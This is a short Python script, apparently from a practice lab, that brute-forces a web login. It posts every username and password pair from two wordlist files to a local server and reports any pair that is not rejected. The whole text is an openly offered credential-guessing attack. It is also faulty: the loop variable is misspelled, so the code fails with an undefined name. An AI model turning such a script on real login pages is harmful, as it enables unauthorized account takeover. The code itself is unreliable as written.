import requests

usernames= open('user_list_test.txt','r')
passwords = open('pass_list_test.txt','r')
########## load text files they should be in the same folder
count =1
for username in usernames:
    username = username.rstrip()
    passwords.seek(0)
    for passwrod in passwords:
        password = password.rstrip()
        req= requests.post('http://localhost:34224/', data={ 'username':username, 'password':password}) # messed up on the port here you can view the website

        if 'invalid credentails, try again' not in req.text:
            print(f' found !!! Username : {username} | Password: {password}')

        else:
            print(f'{count}. not Username: {username} | Password {password}')
        
        count+=1